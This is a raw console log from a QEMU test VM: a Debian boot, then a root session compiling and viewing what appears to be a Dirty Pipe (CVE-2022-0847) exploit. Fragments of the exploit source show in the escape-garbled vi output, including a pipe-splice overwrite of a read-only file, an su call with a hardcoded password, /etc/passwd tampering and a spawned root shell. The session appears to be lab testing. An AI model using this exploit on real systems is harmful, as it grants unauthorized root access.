[    5.299130] SELinux:  Permission map in class dccp_socket not defined in policy.
[    5.304363] SELinux:  Permission perfmon in class capability2 not defined in policy.
[    5.311010] SELinux:  Permission bpf in class capability2 not defined in policy.
[    5.317231] SELinux:  Permission checkpoint_restore in class capability2 not defined in policy.
[    5.324367] SELinux:  Permission map in class tun_socket not defined in policy.
[    5.330024] SELinux:  Permission perfmon in class cap2_userns not defined in policy.
[    5.336238] SELinux:  Permission bpf in class cap2_userns not defined in policy.
[    5.342440] SELinux:  Permission checkpoint_restore in class cap2_userns not defined in policy.
[    5.349488] SELinux:  Class sctp_socket not defined in policy.
[    5.354406] SELinux:  Class icmp_socket not defined in policy.
[    5.359362] SELinux:  Class ax25_socket not defined in policy.
[    5.363471] SELinux:  Class ipx_socket not defined in policy.
[    5.367739] SELinux:  Class netrom_socket not defined in policy.
[    5.372320] SELinux:  Class atmpvc_socket not defined in policy.
[    5.377227] SELinux:  Class x25_socket not defined in policy.
[    5.382081] SELinux:  Class rose_socket not defined in policy.
[    5.386987] SELinux:  Class decnet_socket not defined in policy.
[    5.391810] SELinux:  Class atmsvc_socket not defined in policy.
[    5.395943] SELinux:  Class rds_socket not defined in policy.
[    5.400258] SELinux:  Class irda_socket not defined in policy.
[    5.405077] SELinux:  Class pppox_socket not defined in policy.
[    5.410021] SELinux:  Class llc_socket not defined in policy.
[    5.415043] SELinux:  Class can_socket not defined in policy.
[    5.419924] SELinux:  Class tipc_socket not defined in policy.
[    5.424153] SELinux:  Class bluetooth_socket not defined in policy.
[    5.429147] SELinux:  Class iucv_socket not defined in policy.
[    5.432734] SELinux:  Class rxrpc_socket not defined in policy.
[    5.437128] SELinux:  Class isdn_socket not defined in policy.
[    5.442046] SELinux:  Class phonet_socket not defined in policy.
[    5.447052] SELinux:  Class ieee802154_socket not defined in policy.
[    5.452444] SELinux:  Class caif_socket not defined in policy.
[    5.456295] SELinux:  Class alg_socket not defined in policy.
[    5.460509] SELinux:  Class nfc_socket not defined in policy.
[    5.465301] SELinux:  Class vsock_socket not defined in policy.
[    5.470127] SELinux:  Class kcm_socket not defined in policy.
[    5.474119] SELinux:  Class qipcrtr_socket not defined in policy.
[    5.479066] SELinux:  Class smc_socket not defined in policy.
[    5.484004] SELinux:  Class infiniband_pkey not defined in policy.
[    5.487993] SELinux:  Class infiniband_endport not defined in policy.
[    5.492652] SELinux:  Class bpf not defined in policy.
[    5.497009] SELinux:  Class xdp_socket not defined in policy.
[    5.501214] SELinux:  Class perf_event not defined in policy.
[    5.506178] SELinux:  Class lockdown not defined in policy.
[    5.510897] SELinux:  Class anon_inode not defined in policy.
[    5.515569] SELinux: the above unknown classes and permissions will be allowed
[    5.540246] SELinux:  policy capability network_peer_controls=1
[    5.545145] SELinux:  policy capability open_perms=1
[    5.548268] SELinux:  policy capability extended_socket_class=0
[    5.552372] SELinux:  policy capability always_check_network=0
[    5.557025] SELinux:  policy capability cgroup_seclabel=0
[    5.560698] SELinux:  policy capability nnp_nosuid_transition=0
[    5.565012] SELinux:  policy capability genfs_seclabel_symlinks=0
[    5.596847] audit: type=1403 audit(1658738451.704:2): auid=4294967295 ses=4294967295 lsm=selinux res=1
[    5.604688] systemd[1]: Successfully loaded SELinux policy in 1.137159s.
[    5.652842] audit: type=1400 audit(1658738451.760:3): avc:  denied  { associate } for  pid=1 comm="systemd" name="pts" scontext=system_u:object_r:devpts_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=filesystem permissive=1
[    5.669774] systemd[1]: Relabelled /dev and /run in 12.231ms.
[    5.695789] random: systemd: uninitialized urandom read (16 bytes read)
[    5.715176] systemd[1]: systemd 232 running in system mode. (+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN)
[    5.729958] systemd[1]: Detected virtualization qemu.
[    5.733919] systemd[1]: Detected architecture x86-64.

Welcome to [1mDebian GNU/Linux 9 (stretch)[0m!

[    5.745233] systemd[1]: Set hostname to <syzkaller>.
[    5.780043] random: systemd: uninitialized urandom read (16 bytes read)
[    5.788203] random: systemd-sysv-ge: uninitialized urandom read (16 bytes read)
[    5.827848] systemd-system- (79) used greatest stack depth: 27200 bytes left
[    5.838872] systemd-cryptse (80) used greatest stack depth: 26896 bytes left
[    5.870894] grep (89) used greatest stack depth: 26768 bytes left
[    5.875716] selinux-autorel (83) used greatest stack depth: 26544 bytes left
[    6.053071] systemd[1]: [/etc/systemd/system/rc-local.service:11] Support for option SysVStartPriority= has been removed and it is ignored
[    6.078907] systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
[[0;32m  OK  [0m] Started Dispatch Password Requests to Console Directory Watch.
[    6.090985] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
[[0;32m  OK  [0m] Started Forward Password Requests to Wall Directory Watch.
[    6.101804] systemd[1]: Reached target Encrypted Volumes.
[[0;32m  OK  [0m] Reached target Encrypted Volumes.
[    6.108411] systemd[1]: Reached target Paths.
[[0;32m  OK  [0m] Reached target Paths.
[    6.114810] systemd[1]: Created slice System Slice.
[[0;32m  OK  [0m] Created slice System Slice.
         Mounting POSIX Message Queue File System...
[[0;32m  OK  [0m] Created slice system-getty.slice.
[[0;32m  OK  [0m] Listening on /dev/initctl Compatibility Named Pipe.
         Mounting /sys/kernel/debug...
[[0;32m  OK  [0m] Listening on Journal Socket.
         Starting Create Static Device Nodes in /dev...
         Starting Remount Root and Kernel File Systems...
[[0;32m  OK  [0m] Listening on Journal Audit Socket.
[    6.164921] audit: type=1400 audit(1658738452.269:4): avc:  denied  { audit_read } for  pid=1 comm="systemd" capability=37  scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:system_r:kernel_t:s0 tclass=capability2 permissive=1
[[0;32m  OK  [0m] Created slice system-serial\x2dgetty.slice.
[[0;32m  OK  [0m] Set up automount Arbitrary Executabâ€¦rmats File System Automount Point.[    6.198497] EXT4-fs (sda): re-mounted. Opts: (null). Quota mode: none.

         Mounting /proc/sys/fs/binfmt_misc...
[[0;32m  OK  [0m] Reached target Swap.
[[0;32m  OK  [0m] Listening on Syslog Socket.
[[0;32m  OK  [0m] Listening on udev Control Socket.
[[0;32m  OK  [0m] Listening on udev Kernel Socket.
[[0;32m  OK  [0m] Reached target Slices.
[[0;32m  OK  [0m] Reached target Remote File Systems.
         Mounting /sys/kernel/config...
         Starting Load Kernel Modules...
[[0;32m  OK  [0m] Listening on Journal Socket (/dev/log).
[[0;32m  OK  [0m] Reached target Sockets.
         Starting Journal Service...
[[0;32m  OK  [0m] Mounted POSIX Message Queue File System.
[[0;32m  OK  [0m] Mounted /sys/kernel/debug.
[[0;32m  OK  [0m] Mounted /sys/kernel/config.
[[0;32m  OK  [0m] Mounted /proc/sys/fs/binfmt_misc.
[[0;32m  OK  [0m] Started Create Static Device Nodes in /dev.
[[0;32m  OK  [0m] Started Remount Root and Kernel File Systems.
         Starting Load/Save Random Seed...
         Starting udev Coldplug all Devices...
         Starting udev Kernel Device Manager...
[[0;32m  OK  [0m] Reached target Local File Systems (Pre).
[[0;32m  OK  [0m] Reached target Local File Systems.
[    6.349789] random: crng init done
[    6.351961] random: 7 urandom warning(s) missed due to ratelimiting
[    6.360476] systemd-random- (106) used greatest stack depth: 26224 bytes left
[[0;1;31mFAILED[0m] Failed to start Load Kernel Modules.
See 'systemctl status systemd-modules-load.service' for details.
[[0;32m  OK  [0m] Started Load/Save Random Seed.
         Starting Apply Kernel Variables...
[[0;32m  OK  [0m] Started Apply Kernel Variables.
[[0;32m  OK  [0m] Started Journal Service.
         Starting Flush Journal to Persistent Storage...
         Starting Raise network interfaces...
[[0;32m  OK  [0m] Started udev Kernel Device Manager.
[    6.530013] audit: type=1107 audit(1658738452.638:5): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=system_u:system_r:kernel_t:s0 msg='avc:  denied  { stop } for auid=n/a uid=0 gid=0 path="/lib/systemd/system/systemd-journald.service" cmdline="/bin/journalctl --flush" scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:object_r:unlabeled_t:s0 tclass=service
[    6.530013]  exe="/lib/systemd/systemd" sauid=0 hostname=? addr=? terminal=?'
[    6.562017] systemd-journald[104]: Received request to flush runtime journal from PID 1
[[0;32m  OK  [0m] Started Flush Journal to Persistent Storage.
         Starting Create Volatile Files and Directories...
[    6.702399] systemd-tmpfile (128) used greatest stack depth: 25840 bytes left
[[0;32m  OK  [0m] Started Create Volatile Files and Directories.
         Starting Network Time Synchronization...
         Starting Update UTMP about System Boot/Shutdown...
[[0;32m  OK  [0m] Started Update UTMP about System Boot/Shutdown.
[[0;32m  OK  [0m] Started Network Time Synchronization.
[[0;32m  OK  [0m] Reached target System Time Synchronized.
[[0;32m  OK  [0m] Started udev Coldplug all Devices.
[[0;32m  OK  [0m] Reached target System Initialization.
[[0;32m  OK  [0m] Started Daily Cleanup of Temporary Directories.
[[0;32m  OK  [0m] Reached target Basic System.
         Starting /etc/rc.local Compatibility...
[[0;32m  OK  [0m] Started Regular background program processing daemon.
         Starting System Logging Service...
         Starting getty on tty2-tty6 if dbus and logind are not available...
[[0;32m  OK  [0m] Started Daily apt download activities.
[[0;32m  OK  [0m] Started Daily apt upgrade and clean activities.
[[0;32m  OK  [0m] Reached target Timers.
[[0;32m  OK  [0m] Found device /dev/ttyS0.
[[0;32m  OK  [0m] Started System Logging Service.
[[0;32m  OK  [0m] Started /etc/rc.local Compatibility.
[    7.058403] audit: type=1107 audit(1658738453.166:6): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=system_u:system_r:kernel_t:s0 msg='avc:  denied  { start } for auid=n/a uid=0 gid=0 path="/lib/systemd/system/getty@.service" cmdline="/bin/systemctl --no-block start getty@tty2.service getty@tty3.service getty@tty4.service getty@tty5.service getty@tty6.service" scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:object_r:unlabeled_t:s0 tclass=service
[    7.058403]  exe="/lib/systemd/systemd" sauid=0 hostname=? addr=? terminal=?'
[    7.098735] audit: type=1107 audit(1658738453.205:7): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=system_u:system_r:kernel_t:s0 msg='avc:  denied  { status } for auid=n/a uid=0 gid=0 path="/lib/systemd/system/getty@.service" cmdline="/bin/systemctl --no-block start getty@tty2.service getty@tty3.service getty@tty4.service getty@tty5.service getty@tty6.service" scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:object_r:unlabeled_t:s0 tclass=service
[    7.098735]  exe="/lib/systemd/systemd" sauid=0 hostname=? addr=? terminal=?'
[[0;32m  OK  [0m] Listening on Load/Save RF Kill Switch Status /dev/rfkill Watch.
[[0;32m  OK  [0m] Started getty on tty2-tty6 if dbus and logind are not available.
[    7.234463] e1000: eth0 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: RX
[    7.240959] ip (214) used greatest stack depth: 25728 bytes left
[    7.241087] IPv6: ADDRCONF(NETDEV_CHANGE): eth0: link becomes ready
[[0;32m  OK  [0m] Started Raise network interfaces.
[[0;32m  OK  [0m] Reached target Network.
         Starting OpenBSD Secure Shell server...
         Starting Permit User Sessions...
[[0;32m  OK  [0m] Started Permit User Sessions.
[[0;32m  OK  [0m] Started Getty on tty6.
[[0;32m  OK  [0m] Started Getty on tty1.
[[0;32m  OK  [0m] Started Getty on tty5.
[[0;32m  OK  [0m] Started Getty on tty3.
[[0;32m  OK  [0m] Started Getty on tty2.
[[0;32m  OK  [0m] Started Getty on tty4.
[[0;32m  OK  [0m] Started Serial Getty on ttyS0.
[[0;32m  OK  [0m] Reached target Login Prompts.
[[0;32m  OK  [0m] Started OpenBSD Secure Shell server.
[[0;32m  OK  [0m] Reached target Multi-User System.
[[0;32m  OK  [0m] Reached target Graphical Interface.
         Starting Update UTMP about System Runlevel Changes...
[[0;32m  OK  [0m] Started Update UTMP about System Runlevel Changes.

Debian GNU/Linux 9 syzkaller ttyS0

syzkaller login: root
Unable to get valid context for root
Last login: Mon Jul 25 08:04:29 UTC 2022 on ttyS0
Linux syzkaller 5.13.1 #1 SMP Mon Jul 25 08:50:08 KST 2022 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@syzkaller:~# ld
ld: no input files
root@syzkaller:~# ls
CVE-222-0847.c
root@syzkaller:~# apt insal  yal   tall gcc
Reading package lists... 0%Reading package lists... 100%Reading package lists... Done
Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
gcc is already the newest version (4:6.3.0-4).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
root@syzkaller:~# gcc -o CVE-222-0847.c exploit
[01m[Kgcc:[m[K [01;31m[Kerror: [m[Kexploit: No such file or directory
[01m[Kgcc:[m[K [01;31m[Kfatal error: [m[Kno input files
compilation terminated.
root@syzkaller:~# gcc -o CVE-222-0847.c exploit7.[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1Pc[1P exploit e CVE-222-0847.c 
In file included from [01m[K/usr/include/unistd.h:220:0[m[K,
                 from [01m[KCVE-222-0847.c:2[m[K:
[01m[K/usr/include/x86_64-linux-gnu/bits/types.h:30:1:[m[K [01;31m[Kerror: [m[Kexpected '[01m[K=[m[K', '[01m[K,[m[K', '[01m[K;[m[K', '[01m[Kasm[m[K' or '[01m[K__attribute__[m[K' before '[01m[Ktypedef[m[K'
 [01;31m[Ktypedef[m[K unsigned char __u_char;
 [01;31m[K^~~~~~~[m[K
In file included from [01m[K/usr/include/stdlib.h:275:0[m[K,
                 from [01m[KCVE-222-0847.c:5[m[K:
[01m[K/usr/include/x86_64-linux-gnu/sys/types.h:33:9:[m[K [01;31m[Kerror: [m[Kunknown type name '[01m[K__u_char[m[K'
 typedef [01;31m[K__u_char[m[K u_char;
         [01;31m[K^~~~~~~~[m[K
[01m[KCVE-222-0847.c:[m[K In function '[01m[Kprepare_pipe[m[K':
[01m[KCVE-222-0847.c:22:43:[m[K [01;31m[Kerror: [m[K'[01m[KF_GETPIPE_SZ[m[K' undeclared (first use in this function)
    const unsigned pipe_size = fcntl(p[1], [01;31m[KF_GETPIPE_SZ[m[K);
                                           [01;31m[K^~~~~~~~~~~~[m[K
[01m[KCVE-222-0847.c:22:43:[m[K [01;36m[Knote: [m[Keach undeclared identifier is reported only once for each function it appears in
[01m[KCVE-222-0847.c:[m[K In function '[01m[Kmain[m[K':
[01m[KCVE-222-0847.c:119:46:[m[K [01;35m[Kwarning: [m[Kimplicit declaration of function '[01m[Ksplice[m[K' [[01;35m[K-Wimplicit-function-declaration[m[K]
                             ssize_t nbytes = [01;35m[Ksplice[m[K(fd, &offset, p[1], NULL, 1, 0);
                                              [01;35m[K^~~~~~[m[K
root@syzkaller:~# gcc -o exploit CVE-222-0847.c [1PCVE-222-0847.c exploitexploit CVE-222-0847.c root@syzkaller:~# [Kvo   i CVE-222-0847.c 
[2;1H½[6n[2;1H  [1;1H[1;24r[27m[24m[0m[H[J[24;1H"CVE-222-0847.c" 152L, 6453C[5;45H"\" root"};[9;41Hexecv("/bin/sh", argv);[14;49Hprintf("system() function call ss[15;1Heems to have failed :(\n");[19;57Hreturn EXIT_SUCCESS;
}
[1m~
~
~[0m[24;63H152,1[9CBot[20;1H[24;53H~@k[20;1H[24;53H   [16;8H[24;65H1,1-8[16;8H[24;53H~@k[16;8H[24;53H   [11;8H[24;65H0[11;8H[24;53H~@k[11;8H[24;53H   [10;1H[24;64H49,0-1[10;1H[24;53H~@k[10;1H[24;53H   [6;8H[24;65H8,1-8[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[5L[1;24r[5;33H"/bin/sh;"[23;1H[1m@@@[0m[24;1H[K[24;63H147,1-8[7C98%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[5L[1;24r[5;17H"echo \\\"Done! Popping shell... (run commands now)\\\";"[23;1H[1m@@@[0m[24;63H[K[24;63H146,1-8[7C97%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[5L[1;24r[5;1H"cp /tmp/passwd.bak /etc/passwd;"[23;1H[1m@@@[0m[24;63H[K[24;63H145,1-8[7C96%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[5L[1;24r[4;57H"echo \\\"Restoring /etcc[5;1H/passwd from /tmp/passwd.bak...\\\";"[23;1H[1m@@@[0m[24;63H[K[24;63H144,1-8[7C95%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[5L[1;24r[4;33Hchar *argv[] = {"/bin/sh", "-c", "(echo aaron; cc[5;1Hat) | su - -c \""[23;1H[1m@@@[0m[24;63H[K[24;63H143,1-8[7C95%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[5L[1;24r[4;73H}[23;1H[1m@@@[0m[24;63H[K[24;63H142,1-8[7C94%[6;8H[24;53H~@k[6;8H[24;53H   [10;1H[1;23r[1;1H[5L[1;24r[4;65Hreturn EXIT_FAILL[5;1HURE;[23;1H[1m@@@[0m[24;63H[K[24;63H141,0-1[7C93%[10;1H[24;53H~@k[10;1H[24;53H   [6;8H[24;65H0,1-8[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[5L[1;24r[4;49Hfprintf(stderr, "short write\n"))[5;1H;[23;1H[1m@@@[0m[24;63H[K[24;63H139,1-8[7C93%[6;8H[24;53H~@k[6;8H[24;53H   [9;8H[1;23r[1;1H[8L[1;24r[4;65H}[8;25Hif ((size_t)nbytes < data_size) {[24;63H[K[24;63H138,1-8[7C92%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;57Hreturn EXIT_FAILURE;[23;1H[1m@@@[0m[24;63H[K[24;63H137,1-8[7C91%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;41Hperror("write failed");[23;1H[1m@@@[0m[24;63H[K[24;63H136,1-8[7C90%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;17Hif (nbytes < 0) {[23;1H[1m@@@[0m[24;63H[K[24;63H135,1-8[7C89%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;9Hnbytes = write(p[1], data, data_size);[23;1H[1m@@@[0m[24;63H[K[24;63H134,1-8[7C89%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;10H*[17CPIPE_BUF_FLAG_CAN_MERGE flag */[23;1H[1m@@@[0m[24;63H[K[24;63H133,1-8[7C88%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;10H*[9Cwill instead write into the page cache, because of the[23;1H[1m@@@[0m[24;63H[K[24;63H132,1-8[7C87%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;9H/* the following write will not create a new pipe_buffer, but[23;1H[1m@@@[0m[24;63H[K[24;63H131,1-8[7C87%[9;8H[24;53H~@k[9;8H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[23;1H[1m@@@[0m[24;63H[K[24;63H130,1-8[7C86%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[4L[1;24r[4;49H}[23;1H[1m@@@[0m[24;63H[K[24;63H129,1-8[7C86%[6;8H[24;53H~@k[6;8H[24;53H   [9;1H[1;23r[1;1H[4L[1;24r[4;41Hreturn EXIT_FAILURE;[23;1H[1m@@@[0m[24;63H[K[24;63H128,0-1[7C85%[9;1H[24;53H~@k[9;1H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;25Hfprintf(stderr, "short splice\n");[23;1H[1m@@@[0m[24;63H[K[24;63H127,1-8[7C84%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;1Hif (nbytes == 0) {[23;1H[1m@@@[0m[24;63H[K[24;63H126,1-8[7C84%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;41H}[23;1H[1m@@@[0m[24;63H[K[24;63H125,1-8[7C83%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;33Hreturn EXIT_FAILURE;[23;1H[1m@@@[0m[24;63H[K[24;63H124,1-8[7C82%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[4;17Hperror("splice failed");[23;1H[1m@@@[0m[24;63H[K[24;63H123,1-8[7C81%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[3;73Hif (nbytt[4;1Hes < 0) {[23;1H[1m@@@[0m[24;63H[K[24;63H122,1-8[7C80%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[3;65Hssize_t nbytes ==[4;1H splice(fd, &offset, p[1], NULL, 1, 0);[23;1H[1m@@@[0m[24;63H[K[24;63H121,1-8[7C80%[9;8H[24;53H~@k[9;8H[24;53H   [8;8H[1;23r[1;1H[3L[1;24r[3;57H--offset;[24;63H[K[24;63H120,1-8[7C80%[8;8H[24;53H~@k[8;8H[24;53H   [8;8H[1;23r[1;1H[4L[1;24r[3;58H*[21C  [4;1H   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */[24;63H[K[24;63H119,1-8[7C79%[8;8H[24;53H~@k[8;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[3;58H*[17Csincee[4;1H copy_page_to_iter_pipe() does not initialize the[24;63H[K[24;63H118,1-8[7C78%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[3;58H*[9Cpipe; this wii[4;1Hll add a reference to the page cache, but[24;63H[K[24;63H117,1-8[7C78%[9;8H[24;53H~@k[9;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[3;57H/* splice one byte from  [4;1Hbefore the specified offset into the[24;63H[K[24;63H116,1-8[7C77%[9;8H[24;53H~@k[9;8H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[23;1H[1m@@[0m[23;65H[K[23;3H[1m@[0m[24;63H[K[24;63H115,1-8[7C76%[6;8H[24;53H~@k[6;8H[24;53H   [8;8H[1;23r[1;1H[6L[1;24r[3;41Hint p[2];[6;49Hprepare_pipe(p);[24;63H[K[24;63H114,1-8[7C75%[8;8H[24;53H~@k[8;8H[24;53H   [7;1H[24;65H3,0-1[7;1H[24;53H~@k[7;1H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[3;42H*[9CPIPE_BUF_FLAG_CAN_MERGE */[23;1H[1m@@@[0m[24;63H[K[24;63H112,1-8[7C75%[7;8H[24;53H~@k[7;8H[24;53H   [8;8H[1;23r[1;1H[4L[1;24r[3;41H/* create the pipe with all flags initiaa[4;1Hlized with[23;1H[1m@@@[0m[24;63H[K[24;63H111,1-8[7C74%[8;8H[24;53H~@k[8;8H[24;53H   [6;8H[1;23r[1;1H[L[1;24r[24;63H[K[24;63H110,1-8[7C74%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[4L[1;24r[4;1H}[24;63H[K[24;63H109,1-8[7C73%[6;8H[24;53H~@k[6;8H[24;53H   [9;1H[1;23r[1;1H[4L[1;24r[3;73Hreturn EE[4;1HXIT_FAILURE;[24;63H[K[24;63H108,0-1[7C72%[9;1H[24;53H~@k[9;1H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[3;57Hfprintf(stderr, "Sorry,  [4;1Hcannot enlarge the file\n");[24;63H[K[24;63H107,1-8[7C71%[9;8H[24;53H~@k[9;8H[24;53H   [8;8H[1;23r[1;1H[3L[1;24r[3;33Hif (end_offset > st.st_size) {[24;63H[K[24;63H106,1-8[7C71%[8;8H[24;53H~@k[8;8H[24;53H   [8;8H[1;23r[1;1H[4L[1;24r[3;73H}[23;1H[1m@@[0m[23;41H[K[23;3H[1m@[0m[24;63H[K[24;63H105,1-8[7C69%[8;8H[24;53H~@k[8;8H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[3;65Hreturn EXIT_FAILL[4;1HURE;[24;63H[K[24;63H104,1-8[7C68%[9;8H[24;53H~@k[9;8H[24;53H   [8;1H[24;65H3,0-1[8;1H[24;53H~@k[8;1H[24;53H   [9;8H[1;23r[1;1H[4L[1;24r[3;49Hfprintf(stderr, "Offset is not ii[4;1Hnside the file\n");[24;63H[K[24;63H102,1-8[7C68%[9;8H[24;53H~@k[9;8H[24;53H   [8;8H[1;23r[1;1H[3L[1;24r[3;25Hif (offset > st.st_size) {[23;1H[1m@@@[0m[24;63H[K[24;63H101,1-8[7C67%[8;8H[24;53H~@k[8;8H[24;53H   [8;8H[1;23r[1;1H[4L[1;24r[3;65H}[23;1H[1m@@@[0m[24;63H[K[24;63H100,1-8[7C66%[8;8H[24;53H~@k[8;8H[24;53H   [8;8H[1;23r[1;1H[3L[1;24r[3;57Hreturn EXIT_FAILURE;[23;1H[1m@@@[0m[24;63H[K[24;63H99,1-8[8C65%[8;8H[24;53H~@k[8;8H[24;53H   [7;1H[24;64H8,0-1[7;1H[24;53H~@k[7;1H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[3;41Hperror("stat failed");[23;1H[1m@@@[0m[24;63H[K[24;63H97,1-8[8C64%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[3;17Hif (fstat(fd, &st)) {[23;1H[1m@@[0m[23;65H[K[23;3H[1m@[0m[24;63H[K[24;63H96,1-8[8C64%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[3;9Hstruct stat st;[24;63H[K[24;63H95,1-8[8C63%[7;8H[24;53H~@k[7;8H[24;53H   [8;8H[1;23r[1;1H[4L[1;24r[3;49H}[24;63H[K[24;63H94,1-8[8C62%[8;8H[24;53H~@k[8;8H[24;53H   [8;8H[1;23r[1;1H[3L[1;24r[3;41Hreturn EXIT_FAILURE;[24;63H[K[24;63H93,1-8[8C62%[8;8H[24;53H~@k[8;8H[24;53H   [7;1H[24;64H2,0-1[7;1H[24;53H~@k[7;1H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[3;25Hperror("open failed");[23;1H[1m@@@[0m[24;63H[K[24;63H91,1-8[8C61%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[3;1Hif (fd < 0) {[23;1H[1m@@@[0m[24;63H[K[24;63H90,1-8[8C60%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[2;73Hconst inn[3;1Ht fd = open(path, O_RDONLY); // yes, read-only! :-)[23;1H[1m@@@[0m[24;63H[K[24;63H89,1-8[8C59%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[2;73H/* open  [3;1Hthe input file and validate the specified offset */[23;1H[1m@@@[0m[24;63H[K[24;63H88,1-8[8C59%[7;8H[24;53H~@k[7;8H[24;53H   [8;8H[1;23r[1;1H[4L[1;24r[3;33H}[24;63H[K[24;63H87,1-8[8C58%[8;8H[24;53H~@k[8;8H[24;53H   [8;8H[1;23r[1;1H[3L[1;24r[3;25Hreturn EXIT_FAILURE;[23;1H[1m@@@[0m[24;63H[K[24;63H86,1-8[8C56%[8;8H[24;53H~@k[8;8H[24;53H   [7;1H[24;64H5,0-1[7;1H[24;53H~@k[7;1H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[3;9Hfprintf(stderr, "Sorry, cannot write across a page boundary\n");[23;1H[1m@@@[0m[24;63H[K[24;63H84,1-8[8C56%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[2;65Hif (end_offset >>[3;1H next_page) {[23;1H[1m@@@[0m[24;63H[K[24;63H83,1-8[8C55%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[2;57Hconst loff_t end_offset  [3;1H= offset + (loff_t)data_size;[23;1H[1m@@@[0m[24;63H[K[24;63H82,1-8[8C54%[7;8H[24;53H~@k[7;8H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[2;49Hconst loff_t next_page = (offsett[3;1H | (PAGE_SIZE - 1)) + 1;[23;1H[1m@@@[0m[24;63H[K[24;63H81,1-8[8C54%[7;8H[24;53H~@k[7;8H[24;53H   [8;8H[1;23r[1;1H[4L[1;24r[3;9H}[24;63H[K[24;63H80,1-8[8C53%[8;8H[24;53H~@k[8;8H[24;53H   [8;8H[1;23r[1;1H[3L[1;24r[3;1Hreturn EXIT_FAILURE;[23;1H[1m@@@[0m[24;63H[K[24;63H79,1-8[8C52%[8;8H[24;53H~@k[8;8H[24;53H   [7;1H[24;64H8,0-1[7;1H[24;53H~@k[7;1H[24;53H   [7;8H[1;23r[1;1H[3L[1;24r[2;65Hfprintf(stderr,  [3;1H"Sorry, cannot start writing at a page boundary\n");[23;1H[1m@@@[0m[24;63H[K[24;63H77,1-8[8C51%[7;8H[24;53H~@k[7;8H[24;53H   [6;8H[1;23r[1;1H[2L[1;24r[2;41Hif (offset % PAGE_SIZE == 0) {[23;1H[1m@@@[0m[24;63H[K[24;63H76,1-8[8C50%[6;8H[24;53H~@k[6;8H[24;53H   [6;8H[1;23r[1;1H[3L[1;24r[2;33Hconst size_t data_size = 